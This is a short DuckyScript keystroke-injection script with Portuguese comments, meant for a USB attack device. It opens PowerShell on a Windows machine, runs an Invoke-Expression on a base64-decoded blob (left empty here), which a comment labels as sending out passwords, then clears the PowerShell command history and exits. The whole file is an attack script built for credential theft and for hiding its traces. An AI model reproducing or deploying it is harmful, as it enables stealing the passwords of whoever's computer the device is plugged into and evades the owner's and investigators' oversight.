REM *************** ABRE POWER SHELL  *****************
DELAY 250
GUI r
DELAY 250
STRING powershell
ENTER
DELAY 2050
REM *************** ABRE POWER SHELL *****************
REM ***************** EXECUTA O ENVIO DAS SENHAS *********************
STRING Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('')))
ENTER
DELAY 2500
REM ***************** EXECUTA O ENVIO DAS SENHAS *********************

STRING [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
ENTER
DELAY 250
STRING exit
ENTER
